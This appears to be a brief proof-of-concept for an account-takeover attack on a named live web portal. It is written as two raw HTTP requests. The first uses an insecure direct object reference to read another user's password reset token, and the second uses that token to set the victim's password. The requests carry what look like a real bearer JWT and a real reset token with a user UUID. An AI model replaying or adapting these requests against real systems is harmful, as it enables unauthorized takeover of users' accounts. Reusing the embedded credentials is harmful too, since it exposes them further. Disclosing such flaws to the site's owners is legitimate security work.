# Look for the password reset token

Take advantage of the IDOR Vulnerability found

GET /user-management/user/[VALID USER UUID] HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhIiwicm9sZXMiOlsiU0lNUExFIl0sImluc3RhbGxhdGlvbiI6ImNpdGl6ZW4iLCJvcmdhbml6YXRpb24iOiIiLCJpc3MiOiJodHRwOi8vcG9ydGFsLnNraWxsYWItcHJvamVjdC5ldS9sb2dpbiIsIm5hbWUiOiJhIiwiaWQiOiJjOTlmZjI5NC1lZTkyLTQyZGUtOGE0NS1hOTg2MGFjZTMyY2QiLCJleHAiOjE3Nzk5Mjg5OTJ9.rpMenu1MdKWO1_Mpjemxl-5R3G2atdDj6IsIf82XBAg
Referer: https://portal.skillab-project.eu/citizen/account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive
Content-Length: 12

# Request a password update using the found reset token

PUT /user-management/user/reset-password HTTP/1.1
Host: portal.skillab-project.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 87
Origin: https://portal.skillab-project.eu
Referer: https://portal.skillab-project.eu/reset-password?token=Igu1AaR3Rf%2FzONxs1ogF3tIjtb6jrnbLE%2FFxtw2vPsR%2B6K1qctMfFetL84YnaNTCtaOauJD%2Bptt2WuAB3dUjIUUABJX6kNteXBzQ&uuid=41289887-c0af-4a29-af22-02b478c2eaf4
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"password":"a","token":"[PASSWORD RESET TOKEN]","uuid":"[VALID USER UUID]"}
